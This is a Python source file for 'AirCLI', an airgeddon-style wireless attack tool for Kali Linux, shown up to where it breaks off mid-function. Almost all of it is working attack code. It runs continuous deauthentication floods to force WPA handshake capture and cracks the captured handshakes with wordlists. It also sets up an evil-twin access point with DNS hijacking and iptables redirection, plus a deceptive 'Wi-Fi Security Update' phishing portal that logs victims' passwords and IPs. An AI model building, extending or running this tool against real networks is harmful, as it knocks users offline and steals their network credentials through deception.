#!/usr/bin/env python3
"""
AirCLI - Airgeddon-style CLI Wireless Auditor for Kali Linux
Pure text, colored output by mode/step.
CLI visuals (progress bars █░, spinners, live status, step loaders) where appropriate.
No GUI/TUI. Features: WiFi scan, handshake capture (+auto deauth), deauth, cracking, Fake AP + Captive Portal.
"""

import os
import sys
import time
import re
import csv
import signal
import subprocess
import threading
import shutil
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

# ============== COLORS & STYLING (by mode/step) ==============
C = {
    'reset': '\033[0m',
    'bold': '\033[1m',
    'dim': '\033[2m',

    'header': '\033[95m',      # magenta/purple
    'info': '\033[96m',        # cyan
    'success': '\033[92m',     # green
    'warn': '\033[93m',        # yellow
    'error': '\033[91m',       # red

    'scan': '\033[94m',        # blue
    'capture': '\033[93m',     # yellow
    'attack': '\033[91m',      # red
    'evil': '\033[35m',        # purple
    'captive': '\033[95m',     # bright magenta
    'target': '\033[92m',      # green
    'clean': '\033[90m',       # gray
}

STEP_COLOR = {
    'SCAN': 'scan',
    'TARGET': 'target',
    'CAPTURE': 'capture',
    'DEAUTH': 'attack',
    'CRACK': 'capture',
    'EVIL': 'evil',
    'CAPTIVE': 'captive',
    'FAKEAP': 'evil',
    'INFO': 'info',
    'SUCCESS': 'success',
    'WARN': 'warn',
    'ERROR': 'error',
    'CLEAN': 'clean',
}

def colorize(text, step=None, bold=False):
    if step and step in STEP_COLOR:
        col = C.get(STEP_COLOR[step], C['info'])
    else:
        col = C['info']
    if bold:
        col = C['bold'] + col
    return f"{col}{text}{C['reset']}"

def banner():
    print(colorize(r"""
     _    _          _____ _      _____ 
    / \  (_)_ __ ___|  ___| |    |_   _|
   / _ \ | | '__/ __| |_  | |      | |  
  / ___ \| | | | (__|  _| | |___   | |  
 /_/   \_\_|_|  \___|_|   |_____|  |_|  
    """, 'header', bold=True))
    print(colorize("AirCLI - Airgeddon-like CLI WiFi Auditor  |  All text, fully colored by step", 'header'))
    print(colorize("Kali Linux tool  |  Like airgeddon by v1s1t0r1sh3r3 but pure CLI + enhanced FakeAP+Captive", 'info'))
    print()

def log(msg, step='INFO'):
    prefix = f"[{step}]"
    print(f"{colorize(prefix, step)} {msg}")

def success(msg):
    log(msg, 'SUCCESS')

def warn(msg):
    log(msg, 'WARN')

def error(msg):
    log(msg, 'ERROR')

def prompt(msg):
    return input(colorize(f"[?] {msg}: ", 'info'))

def pause():
    input(colorize("\n[Press Enter to continue]", 'clean'))

# ============== CLI VISUALS (progress bars, spinners, loaders - pure text/ANSI, no GUI) ==============
def progress_bar(current, total, prefix="", length=28, step=None, suffix=""):
    """In-place progress bar using ANSI. Safe for any modern terminal."""
    if total <= 0:
        total = 1
    percent = int(100 * (current / float(total)))
    filled_length = int(length * current // total)
    bar = '█' * filled_length + '░' * (length - filled_length)
    colored = colorize(f"[{prefix}]", step) if prefix else ""
    sys.stdout.write(f"\r{colored} |{bar}| {percent:3d}% {suffix}")
    sys.stdout.flush()
    if current >= total:
        sys.stdout.write("\n")
        sys.stdout.flush()

def show_step(text, ok=True, step='EVIL'):
    """Print a step with loading -> checkmark. E.g. for service startup."""
    sym = colorize("✓", 'success') if ok else colorize("✗", 'error')
    print(colorize(f"  ⟳ {text}...", step), end=" ", flush=True)
    time.sleep(0.2)
    print(sym)

def spinner(text, duration=1.2, step='INFO'):
    """Short blocking spinner animation (pure text)."""
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    end = time.time() + duration
    i = 0
    while time.time() < end:
        ch = chars[i % len(chars)]
        sys.stdout.write(f"\r{colorize(f'[{step}]', step)} {ch} {text}")
        sys.stdout.flush()
        time.sleep(0.08)
        i += 1
    sys.stdout.write("\r" + " " * (len(text) + 25) + "\r")
    sys.stdout.flush()

def clear_screen():
    """Clear the terminal so only the current menu (and its immediate output) is visible.
    Uses ANSI for speed and compatibility in terminals/tmux."""
    sys.stdout.write("\033[2J\033[H")
    sys.stdout.flush()

# ============== STATE ==============
class State:
    def __init__(self):
        self.iface = None
        self.mon_iface = None
        self.target = None  # dict: bssid, essid, ch, enc, power etc
        self.last_scan_file = None
        self.active_procs = []  # list of Popen
        self.captive_log = "/tmp/aircli_captured_creds.txt"
        self.hostapd_conf = "/tmp/aircli_hostapd.conf"
        self.dnsmasq_conf = "/tmp/aircli_dnsmasq.conf"
        self.portal_script = "/tmp/aircli_portal.py"
        self.scan_csv = "/tmp/aircli_scan-01.csv"
        self.handshake_cap = "/tmp/aircli_handshake.cap"
        self._original_iptables = None

STATE = State()

def is_root():
    return os.geteuid() == 0

def check_deps():
    log("Checking required tools...", 'INFO')
    required = [
        'airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng',
        'hostapd', 'dnsmasq', 'iw', 'ip', 'iptables'
    ]
    missing = []
    for tool in required:
        if shutil.which(tool) is None:
            missing.append(tool)
    if missing:
        warn(f"Missing tools: {', '.join(missing)}")
        log("On Kali: sudo apt update && sudo apt install -y aircrack-ng hostapd dnsmasq iw net-tools iptables", 'WARN')
        return False
    success("All core tools present.")
    return True

def run_cmd(cmd, timeout=None, capture=True, check=False):
    """Run command, return (rc, stdout, stderr)"""
    try:
        res = subprocess.run(
            cmd if isinstance(cmd, list) else cmd.split(),
            capture_output=capture,
            text=True,
            timeout=timeout,
            check=check
        )
        return res.returncode, res.stdout or '', res.stderr or ''
    except subprocess.TimeoutExpired:
        return 124, '', 'timeout'
    except Exception as e:
        return 1, '', str(e)

def kill_proc(proc):
    if proc and proc.poll() is None:
        try:
            proc.terminate()
            time.sleep(0.5)
            if proc.poll() is None:
                proc.kill()
        except Exception:
            pass

def cleanup_all(kill_mon=False):
    log("Cleaning up processes, iptables, and configs...", 'CLEAN')
    steps = ["Stopping processes", "Flushing iptables", "Resetting interfaces", "Removing temps"]
    for i, s in enumerate(steps, 1):
        progress_bar(i, len(steps), prefix="CLEAN", step='CLEAN', suffix=s)
        time.sleep(0.1)

    # Kill tracked procs (with timeout protection)
    for p in list(STATE.active_procs):
        try:
            kill_proc(p)
        except:
            pass
    STATE.active_procs.clear()

    # Kill by name - use timeout
    for name in ['hostapd', 'dnsmasq']:
        try:
            run_cmd(['pkill', '-9', '-f', name], timeout=5)
        except:
            pass

    # iptables flush with timeout
    try:
        run_cmd(['iptables', '-t', 'nat', '-F'], timeout=5)
        run_cmd(['iptables', '-t', 'nat', '-X'], timeout=5)
        run_cmd(['iptables', '-F'], timeout=5)
        run_cmd(['iptables', '-X'], timeout=5)
    except Exception:
        pass

    # Reset monitor if any
    if STATE.mon_iface:
        try:
            run_cmd(['airmon-ng', 'stop', STATE.mon_iface], timeout=10)
        except:
            pass

    # Force managed on the AP iface
    if STATE.iface:
        try:
            run_cmd(['ip', 'link', 'set', STATE.iface, 'down'], timeout=5)
            run_cmd(['iw', 'dev', STATE.iface, 'set', 'type', 'managed'], timeout=5)
            run_cmd(['ip', 'link', 'set', STATE.iface, 'up'], timeout=5)
        except:
            pass

    # Remove temps
    for f in [STATE.hostapd_conf, STATE.dnsmasq_conf, STATE.portal_script, STATE.scan_csv, STATE.captive_log]:
        try:
            if os.path.exists(f):
                os.unlink(f)
        except:
            pass

    STATE.mon_iface = None
    success("Cleanup complete.")

def list_interfaces():
    log("Detecting wireless interfaces...", 'INFO')
    rc, out, err = run_cmd(['iw', 'dev'])
    ifaces = []
    current = None
    for line in out.splitlines():
        line = line.strip()
        if line.startswith('Interface'):
            current = line.split()[1]
            ifaces.append({'name': current, 'type': 'unknown', 'mode': 'unknown'})
        if 'type' in line and current:
            parts = line.split()
            if 'managed' in line or 'monitor' in line:
                ifaces[-1]['mode'] = 'monitor' if 'monitor' in line else 'managed'
    # Also via airmon-ng
    rc2, out2, _ = run_cmd(['airmon-ng'])
    final = []
    seen = set()
    for i in ifaces:
        if i['name'] not in seen:
            seen.add(i['name'])
            final.append(i)
    if not final:
        rc, out, _ = run_cmd(['ip', '-o', 'link', 'show'])
        for line in out.splitlines():
            if 'wlan' in line or 'wl' in line:
                name = line.split(':')[1].strip().split('@')[0]
                if name not in seen:
                    final.append({'name': name, 'mode': 'unknown'})
    # Add USB hint
    for i in final:
        try:
            rc, link, _ = run_cmd(['readlink', f'/sys/class/net/{i["name"]}/device'])
            if 'usb' in link.lower():
                i['hint'] = ' (USB adapter - BEST for Fake AP)'
            else:
                i['hint'] = ' (internal/PCI - often poor AP support)'
        except:
            i['hint'] = ''
    return final

def select_interface():
    ifaces = list_interfaces()
    if not ifaces:
        error("No wireless interfaces found. Plug in adapter or check drivers.")
        return None
    print(colorize("\nAvailable interfaces:", 'INFO', bold=True))
    for idx, i in enumerate(ifaces, 1):
        hint = i.get('hint', '')
        print(f"  {idx}) {i['name']}  [{i.get('mode','?')}] {hint}")
    choice = prompt("Select interface number")
    try:
        sel = ifaces[int(choice)-1]['name']
        STATE.iface = sel
        log(f"Selected interface: {sel}", 'TARGET')
        return sel
    except:
        error("Invalid selection.")
        return None

def set_monitor_mode(iface=None):
    iface = iface or STATE.iface
    if not iface:
        error("No interface selected.")
        return False
    log(f"Putting {iface} into monitor mode...", 'SCAN')
    # Small visual
    print(colorize("  Switching interface  ", 'scan'), end="", flush=True)
    for _ in range(5):
        sys.stdout.write("▓")
        sys.stdout.flush()
        time.sleep(0.06)
    print(colorize(" done", 'success'))
    # stop any existing
    run_cmd(['airmon-ng', 'stop', iface + 'mon'])
    rc, out, err = run_cmd(['airmon-ng', 'start', iface])
    # Detect new mon name
    mon = None
    m = re.search(r'(wlan\d+mon|mon\d+|wlx[0-9a-f]+mon)', out + err)
    if m:
        mon = m.group(1)
    else:
        # common: wlan0 -> wlan0mon
        mon = iface + 'mon' if not iface.endswith('mon') else iface
    # Verify
    time.sleep(1)
    rc2, out2, _ = run_cmd(['iw', 'dev', mon, 'info'])
    if 'monitor' in out2.lower() or rc == 0:
        STATE.mon_iface = mon
        success(f"Monitor mode enabled: {mon}")
        return True
    # fallback try iw
    run_cmd(['ip', 'link', 'set', iface, 'down'])
    run_cmd(['iw', 'dev', iface, 'set', 'monitor', 'none'])
    run_cmd(['ip', 'link', 'set', iface, 'up'])
    STATE.mon_iface = iface
    success(f"Monitor mode (iw): {iface}")
    return True

def set_managed_mode(iface=None):
    iface = iface or STATE.iface
    if not iface:
        return
    log(f"Restoring managed mode on {iface}...", 'CLEAN')
    print(colorize("  Restoring managed  ", 'clean'), end="", flush=True)
    for _ in range(4):
        sys.stdout.write("░")
        sys.stdout.flush()
        time.sleep(0.05)
    print(colorize(" ok", 'success'))
    run_cmd(['airmon-ng', 'stop', iface + 'mon'])
    run_cmd(['ip', 'link', 'set', iface, 'down'])
    run_cmd(['iw', 'dev', iface, 'set', 'type', 'managed'])
    run_cmd(['ip', 'link', 'set', iface, 'up'])
    STATE.mon_iface = None
    success("Managed mode restored.")

# ============== SCANNING ==============
def parse_airodump_csv(csv_path):
    aps = []
    if not os.path.exists(csv_path):
        return aps
    client_counts = {}
    try:
        with open(csv_path, 'r', errors='ignore') as f:
            content = f.read()
        # Split on "Station MAC" to separate APs from clients/stations
        parts = re.split(r'Station MAC', content, flags=re.I)
        ap_section = parts[0]
        reader = csv.reader(ap_section.splitlines())
        header_found = False
        for row in reader:
            if not row or len(row) < 14:
                continue
            if 'BSSID' in row[0]:
                header_found = True
                continue
            if not header_found:
                continue
            bssid = row[0].strip()
            if not bssid or ':' not in bssid:
                continue
            essid = row[13].strip() if len(row) > 13 else ''
            # Some rows have extra commas if hidden
            if not essid and len(row) > 14:
                essid = row[14].strip() if row[14] else '<hidden>'
            ch = row[3].strip()
            enc = row[5].strip() if len(row) > 5 else ''
            power = row[8].strip()
            aps.append({
                'bssid': bssid,
                'essid': essid or '<hidden>',
                'ch': ch,
                'enc': enc,
                'power': power,
                'client_count': 0
            })
        # Parse client/station section for associated clients
        if len(parts) > 1:
            client_section = parts[1]
            for row in csv.reader(client_section.splitlines()):
                if len(row) > 5:
                    bssid = row[5].strip()
                    if bssid and ':' in bssid and not bssid.startswith('('):
                        client_counts[bssid] = client_counts.get(bssid, 0) + 1
    except Exception as e:
        error(f"CSV parse error: {e}")
    # Attach client counts and dedup
    seen = set()
    uniq = []
    for a in aps:
        key = a['bssid']
        if key not in seen:
            seen.add(key)
            a['client_count'] = client_counts.get(key, 0)
            uniq.append(a)
    return uniq

def scan_networks(duration=12):
    if not STATE.mon_iface:
        error("Monitor mode required. Use Interface menu first.")
        return []
    log(f"Scanning for WiFi networks ({duration}s)...", 'SCAN')
    # Remove old
    for f in [STATE.scan_csv, STATE.scan_csv.replace('-01', '')]:
        if os.path.exists(f):
            os.unlink(f)
    cmd = [
        'airodump-ng',
        '--output-format', 'csv',
        '-w', '/tmp/aircli_scan',
        '--write-interval', '1',
        STATE.mon_iface
    ]
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    STATE.active_procs.append(proc)

    # Animated progress bar for scan (pure CLI)
    for sec in range(1, duration + 1):
        progress_bar(sec, duration, prefix="SCAN", step='SCAN', suffix=f"probing channels {sec}s/{duration}s")
        time.sleep(1)

    kill_proc(proc)
    if proc in STATE.active_procs:
        STATE.active_procs.remove(proc)

    aps = parse_airodump_csv(STATE.scan_csv)
    if aps:
        with_clients = sum(1 for a in aps if a.get('client_count', 0) > 0)
        success(f"Found {len(aps)} networks ({with_clients} with clients - shown in red).")
        STATE.last_scan_file = STATE.scan_csv
    else:
        warn("No networks found or parse failed. Try longer scan or different channel.")
    return aps

def display_networks(aps):
    if not aps:
        print(colorize("No networks.", 'WARN'))
        return
    print(colorize("\n  #   BSSID               CH   PWR   ENC    CL  ESSID", 'scan', bold=True))
    print(colorize("  " + "-"*68, 'clean'))
    for i, ap in enumerate(aps, 1):
        b = ap['bssid']
        e = ap['essid'][:28]
        cc = ap.get('client_count', 0)
        cl_str = f"{cc:>2}" if cc > 0 else " -"
        line = f"  {i:<3} {b:<18} {ap['ch']:>3}  {ap['power']:>4}  {ap['enc']:<10} {cl_str:>2}  {e}"
        if cc > 0:
            # Networks with clients shown in red
            print(colorize(line, 'error'))
        else:
            print(line)
    print()

def select_target(aps=None):
    if aps is None:
        aps = parse_airodump_csv(STATE.scan_csv) if STATE.scan_csv else []
    if not aps:
        # manual entry
        log("Manual target entry (no recent scan)", 'TARGET')
        essid = prompt("ESSID (network name)")
        bssid = prompt("BSSID (xx:xx:xx:xx:xx:xx)")
        ch = prompt("Channel (e.g. 6)")
        enc = prompt("Encryption (WPA2/OPN etc, optional)")
        STATE.target = {'essid': essid, 'bssid': bssid, 'ch': ch, 'enc': enc or 'WPA2', 'client_count': 0}
        success(f"Target set manually: {essid}")
        return STATE.target

    display_networks(aps)
    choice = prompt("Select target # (or 0 for manual)")
    try:
        n = int(choice)
        if n == 0:
            return select_target([])
        if 1 <= n <= len(aps):
            STATE.target = aps[n-1]
            log(f"Target locked: {STATE.target['essid']} ({STATE.target['bssid']}) ch{STATE.target['ch']}", 'TARGET')
            return STATE.target
    except:
        pass
    error("Bad selection.")
    return None

# ============== HANDSHAKE & DEAUTH ==============
def capture_handshake():
    if not STATE.target or not STATE.mon_iface:
        error("Need target + monitor interface.")
        return False

    t = STATE.target
    capfile = STATE.handshake_cap
    log(f"Starting handshake capture on {t['essid']}", 'CAPTURE')
    log("Automatic deauth enabled - forcing clients to reconnect for handshake.", 'DEAUTH')

    cmd = [
        'airodump-ng',
        '-c', str(t['ch']),
        '--bssid', t['bssid'],
        '-w', capfile.replace('.cap',''),
        '--output-format', 'pcap,csv',
        STATE.mon_iface
    ]
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    STATE.active_procs.append(proc)

    # Automatically launch continuous deauth in background (standard for handshake capture)
    deauth_proc = subprocess.Popen(
        ['aireplay-ng', '--deauth', '0', '-a', t['bssid'], '-D', STATE.mon_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    STATE.active_procs.append(deauth_proc)

    print(colorize("\nCapture running with AUTOMATIC DEAUTH...", 'capture'))
    print(colorize("Deauth is flooding the target to force handshake generation.", 'attack'))

    try:
        for sec in range(1, 91):
            # Live updating progress (CLI friendly)
            pct = int((sec / 90) * 100)
            filled = int(22 * sec / 90)
            bar = '▓' * filled + '░' * (22 - filled)
            status = f"\r{colorize('[CAPTURE]', 'capture')} [{bar}] {sec:02d}/90s | Deauth: ON | Checking..."
            sys.stdout.write(status)
            sys.stdout.flush()

            time.sleep(1)

            # quick check for eapol
            if os.path.exists(capfile):
                rc, out, _ = run_cmd(['aircrack-ng', capfile, '-b', t['bssid']], timeout=5)
                if '1 handshake' in (out or '').lower() or 'handshake' in (out or '').lower():
                    sys.stdout.write("\n")
                    success("Handshake detected!")
                    break
        else:
            sys.stdout.write("\n")
    except KeyboardInterrupt:
        sys.stdout.write("\n")
    finally:
        kill_proc(proc)
        if proc in STATE.active_procs:
            STATE.active_procs.remove(proc)
        kill_proc(deauth_proc)
        if deauth_proc in STATE.active_procs:
            STATE.active_procs.remove(deauth_proc)

    # Verify
    time.sleep(1)
    rc, out, _ = run_cmd(['aircrack-ng', capfile, '-b', t['bssid']], timeout=8)
    if 'handshake' in (out or '').lower():
        success(f"Handshake saved: {capfile}")
        return True
    else:
        warn(f"No confirmed handshake yet. File: {capfile}")
        return False

def deauth_attack(count=10, client=None):
    if not STATE.target or not STATE.mon_iface:
        error("Need target + monitor iface.")
        return
    t = STATE.target
    log(f"Sending deauth ({count} packets) to {t['essid']}", 'DEAUTH')

    # Quick visual burst indicator
    print(colorize("  Deauthing ", 'attack'), end="", flush=True)
    for i in range(min(8, count // 2 + 1)):
        sys.stdout.write(colorize("▓", 'attack'))
        sys.stdout.flush()
        time.sleep(0.03)
    print()

    cmd = ['aireplay-ng', '--deauth', str(count), '-a', t['bssid'], '-D', STATE.mon_iface]
    if client:
        cmd += ['-c', client]
    rc, out, err = run_cmd(cmd, timeout=20)
    if rc == 0:
        success("Deauth packets sent.")
    else:
        warn("Deauth may have issues (driver/card).")

def crack_handshake():
    if not os.path.exists(STATE.handshake_cap):
        error("No capture file. Capture handshake first.")
        return
    t = STATE.target or {'bssid': '??'}
    wordlist = prompt("Wordlist path (e.g. /usr/share/wordlists/rockyou.txt)")
    if not os.path.exists(wordlist):
        error("Wordlist not found.")
        return
    log(f"Cracking {STATE.handshake_cap} with {wordlist}", 'CRACK')
    cmd = ['aircrack-ng', '-w', wordlist, '-b', t.get('bssid',''), '-l', '/tmp/aircli_key.txt', STATE.handshake_cap]

    print(colorize("  Running aircrack-ng (this may take a while)...", 'capture'))
    proc = subprocess.Popen(cmd)  # Let aircrack show its own output
    proc.wait()

    if os.path.exists('/tmp/aircli_key.txt'):
        with open('/tmp/aircli_key.txt') as f:
            key = f.read().strip()
        success(f"KEY FOUND: {key}")
    else:
        warn("Key not found (try better wordlist / rules).")

# ============== FAKE AP + CAPTIVE PORTAL ==============
CAPTIVE_HTML = r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Wi-Fi Security Update</title>
<style>
  body { font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color:#e2e8f0; margin:0; padding:0; display:flex; align-items:center; justify-content:center; min-height:100vh; }
  .card { background:#1e293b; border-radius:16px; box-shadow:0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1); width:100%; max-width:420px; padding:32px 28px; border:1px solid #334155; }
  .header { display:flex; align-items:center; gap:12px; margin-bottom:24px; }
  .icon { width:48px; height:48px; background:#3b82f6; border-radius:9999px; display:flex; align-items:center; justify-content:center; font-size:26px; }
  h1 { font-size:21px; margin:0; font-weight:600; color:#f1f5f9; }
  .subtitle { font-size:13px; color:#64748b; margin-top:4px; }
  .notice { background:#1e293b; border:1px solid #475569; padding:12px 14px; border-radius:10px; font-size:13px; line-height:1.4; margin:18px 0; color:#cbd5e1; }
  label { font-size:12px; color:#94a3b8; display:block; margin-bottom:6px; font-weight:500; }
  input[type=text], input[type=password] { width:100%; background:#0f172a; border:1px solid #475569; color:#e2e8f0; padding:12px 14px; border-radius:10px; font-size:15px; box-sizing:border-box; }
  input:focus { outline:none; border-color:#3b82f6; }
  .btn { margin-top:18px; width:100%; background:#3b82f6; color:white; border:none; padding:13px; font-weight:600; font-size:15px; border-radius:10px; cursor:pointer; transition:all .1s; }
  .btn:hover { background:#2563eb; }
  .btn:active { transform:scale(0.985); }
  .footer { margin-top:22px; font-size:11px; color:#475569; text-align:center; }
  .small { font-size:12px; color:#64748b; }
  .success { display:none; text-align:center; padding:20px 0; }
  .success h2 { color:#22c55e; margin:0 0 8px; }
</style>
</head>
<body>
  <div class="card">
    <div class="header">
      <div class="icon">📶</div>
      <div>
        <h1>Wi-Fi Security Update</h1>
        <div class="subtitle">Firmware patch v2.4.9 required</div>
      </div>
    </div>

    <div id="form-area">
      <div class="notice">
        A critical security update is required to maintain secure connectivity and prevent unauthorized access to your network.
      </div>

      <form id="credform" method="POST" action="/submit">
        <div>
          <label>Network Name (SSID)</label>
          <input type="text" name="ssid" value="__ESSID__" readonly>
        </div>
        <div style="margin-top:14px;">
          <label>Wi-Fi Password</label>
          <input type="password" name="password" placeholder="Enter your Wi-Fi password" required autocomplete="current-password">
        </div>
        <button type="submit" class="btn">Apply Update &amp; Reconnect</button>
      </form>
      <div class="footer">This update is mandatory for continued network access.<br>Your credentials are verified securely.</div>
    </div>

    <div id="success-area" class="success">
      <h2>✓ Update Applied</h2>
      <p class="small">Security patch installed successfully.<br>Your connection will be restored momentarily.</p>
      <div style="margin-top:16px;font-size:12px;color:#64748b;">You may close this window.</div>
    </div>
  </div>

<script>
  const form = document.getElementById('credform');
  form.addEventListener('submit', function(e) {
    const btns = form.querySelectorAll('button');
    if (btns.length) btns[0].innerText = 'Verifying & applying...';
    // Let the form submit normally for broad compatibility
    setTimeout(function(){
      document.getElementById('form-area').style.display = 'none';
      document.getElementById('success-area').style.display = 'block';
    }, 650);
  });
</script>
</body>
</html>
'''

def write_portal_server(essid, listen_port=80):
    """Write a standalone portal server script to disk"""
    server_code = f'''#!/usr/bin/env python3
import os, sys, time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
from datetime import datetime

CAPTURE_LOG = "/tmp/aircli_captured_creds.txt"
ESSID = {repr(essid)}
HTML = """{CAPTIVE_HTML}""".replace("__ESSID__", ESSID)

class CaptiveHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.send_header("Cache-Control", "no-cache")
        self.end_headers()
        self.wfile.write(HTML.encode("utf-8"))

    def do_POST(self):
        if self.path in ("/submit", "/login", "/auth"):
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length).decode('utf-8', errors='ignore')
            params = parse_qs(body)
            pw = params.get('password', [''])[0]
            ss = params.get('ssid', [ESSID])[0]
            client_ip = self.client_address[0]
            ts = datetime.now().isoformat(sep=' ', timespec='seconds')
            entry = f"{{ts}} | SSID: {{ss}} | IP: {{client_ip}} | PASS: {{pw}}\\n"
            with open(CAPTURE_LOG, "a") as f:
                f.write(entry)
            print(f"[CAPTIVE] CREDENTIALS CAPTURED: {{ss}} / {{pw}} from {{client_ip}}", flush=True)
            # Success response
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            success_html = """<!doctype html><html><head><meta charset="utf-8"><title>Updated</title>
<style>body{{font-family:system-ui;background:#0f172a;color:#e2e8f0;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}}.box{{background:#1e293b;padding:32px;border-radius:12px;text-align:center;border:1px solid #334155}}h1{{color:#22c55e;margin:0 0 12px}}p{{color:#94a3b8}}</style>
</head><body><div class="box"><h1>Update Complete</h1><p>Security patch applied. Reconnecting to network...</p></div></body></html>"""
            self.wfile.write(success_html.encode())
            return
        self.send_response(404)
        self.end_headers()

    def log_message(self, format, *args):
        return  # quiet

if __name__ == "__main__":
    port = {listen_port}
    print(f"[CAPTIVE] Starting captive portal on port {{port}} for SSID: {{ESSID}}", flush=True)
    httpd = HTTPServer(("", port), CaptiveHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
'''
    with open(STATE.portal_script, "w") as f:
        f.write(server_code)
    os.chmod(STATE.portal_script, 0o755)
    return STATE.portal_script

def launch_fake_ap(essid, channel=6, bssid=None, with_captive=True, iface=None):
    """Launch hostapd + dnsmasq + (optional captive)"""
    if not iface:
        if STATE.iface and not str(STATE.iface).endswith('mon'):
            iface = STATE.iface
        elif STATE.mon_iface:
            log("Restoring interface from monitor mode for AP operation...", 'EVIL')
            run_cmd(['airmon-ng', 'stop', STATE.mon_iface])
            base = STATE.mon_iface[:-3] if STATE.mon_iface.endswith('mon') else STATE.mon_iface
            iface = base
            STATE.mon_iface = None
            STATE.iface = base
        else:
            iface = 'wlan0'

    # Force: never run hostapd on a monitor interface
    if iface and iface.endswith('mon'):
        base = iface[:-3]
        log(f"Interface {iface} is monitor - switching to base {base} for hostapd", 'EVIL')
        run_cmd(['airmon-ng', 'stop', iface])
        iface = base
        STATE.mon_iface = None
        STATE.iface = base

    if not iface:
        error("No interface for AP.")
        return False

    log(f"Configuring Fake AP '{essid}' on channel {channel} ({iface})", 'EVIL')

    # Visual step-by-step startup (CLI progress feel)
    show_step("Killing conflicting processes", step='EVIL')
    run_cmd(['pkill', '-9', '-f', 'hostapd'])
    run_cmd(['pkill', '-9', '-f', 'dnsmasq'])

    show_step("Ensuring managed mode and bringing interface up", step='EVIL')
    run_cmd(['iw', 'reg', 'set', 'US'])
    run_cmd(['ip', 'link', 'set', iface, 'down'])
    run_cmd(['iw', 'dev', iface, 'set', 'type', 'managed'])
    run_cmd(['ip', 'addr', 'flush', 'dev', iface])
    run_cmd(['ip', 'addr', 'add', '192.168.1.1/24', 'dev', iface])
    run_cmd(['ip', 'link', 'set', iface, 'up'])
    time.sleep(0.8)

    # Verify not in monitor mode
    rc, info, _ = run_cmd(['iw', 'dev', iface, 'info'])
    if 'monitor' in info.lower():
        warn(f"Interface {iface} is still in monitor mode! AP may fail.")
    else:
        print(colorize("  Interface is in managed mode", 'success'))

    # Final sanity
    if iface.endswith('mon'):
        error(f"CRITICAL: Still on monitor interface {iface}. This will prevent broadcasting.")

    # Determine hw_mode based on channel (basic support)
    hw_mode = 'a' if channel > 14 else 'g'

    show_step("Writing hostapd config", step='EVIL')
    hostapd = f"""interface={iface}
driver=nl80211
ssid={essid}
hw_mode={hw_mode}
channel={channel}
country_code=US
ieee80211d=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
beacon_int=100
"""
    if bssid:
        hostapd += f"bssid={bssid}\n"
    with open(STATE.hostapd_conf, "w") as f:
        f.write(hostapd)

    show_step("Writing dnsmasq + DNS blackhole config", step='EVIL')
    dns = f"""interface={iface}
dhcp-range=192.168.1.10,192.168.1.50,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
log-queries
log-dhcp
"""
    with open(STATE.dnsmasq_conf, "w") as f:
        f.write(dns)

    show_step("Applying iptables redirection (captive)", step='CAPTIVE')
    run_cmd(['iptables', '-t', 'nat', '-F'])
    run_cmd(['iptables', '-F'])
    run_cmd(['iptables', '-A', 'FORWARD', '-i', iface, '-j', 'ACCEPT'])
    run_cmd(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE'])
    run_cmd(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', '192.168.1.1:80'])
    run_cmd(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '443', '-j', 'DNAT', '--to-destination', '192.168.1.1:80'])

    show_step("Starting hostapd (rogue AP)", step='EVIL')
    hp = subprocess.Popen(['hostapd', STATE.hostapd_conf], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    STATE.active_procs.append(hp)
    time.sleep(2)

    # Verify hostapd actually started and is still running
    if hp.poll() is not None:
        output = ""
        try:
            output = hp.stdout.read() if hp.stdout else ""
        except:
            pass
        error(f"hostapd failed to start or exited:\n{output}")
        # continue anyway so the interactive screen shows the diagnostics
        # return False  <--- removed to always show the evil twin screen

    show_step("Starting dnsmasq (DHCP/DNS)", step='EVIL')
    dq = subprocess.Popen(['dnsmasq', '-C', STATE.dnsmasq_conf, '-d'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    STATE.active_procs.append(dq)
    time.sleep(0.8)

    success(f"Fake AP '{essid}' is UP on {iface} (ch {channel})")

    # === Post-launch diagnostics to help debug why phone doesn't see it ===
    print()
    log("Running diagnostics for Fake AP...", 'EVIL')
    print(colorize("  Interface info:", 'info'))
    rc, iwout, _ = run_cmd(['iw', 'dev', iface, 'info'], timeout=3)
    if iwout.strip():
        for line in iwout.splitlines():
            line = line.strip()
            if line:
                print("    " + line)
    else:
        print("    (no output from iw - interface may be invalid or driver issue)")
    print(colorize("  hostapd process check:", 'info'))
    rc, psout, _ = run_cmd(['pgrep', '-a', 'hostapd'])
    print("    " + (psout.strip() if psout.strip() else "No hostapd process found!"))
    print(colorize("  dnsmasq process check:", 'info'))
    rc, psout2, _ = run_cmd(['pgrep', '-a', 'dnsmasq'])
    print("    " + (psout2.strip() if psout2.strip() else "No dnsmasq process found!"))

    # Read any early output from hostapd (best effort)
    try:
        if hp.stdout:
            # Try to grab some output without blocking too much
            early = ""
            for _ in range(5):
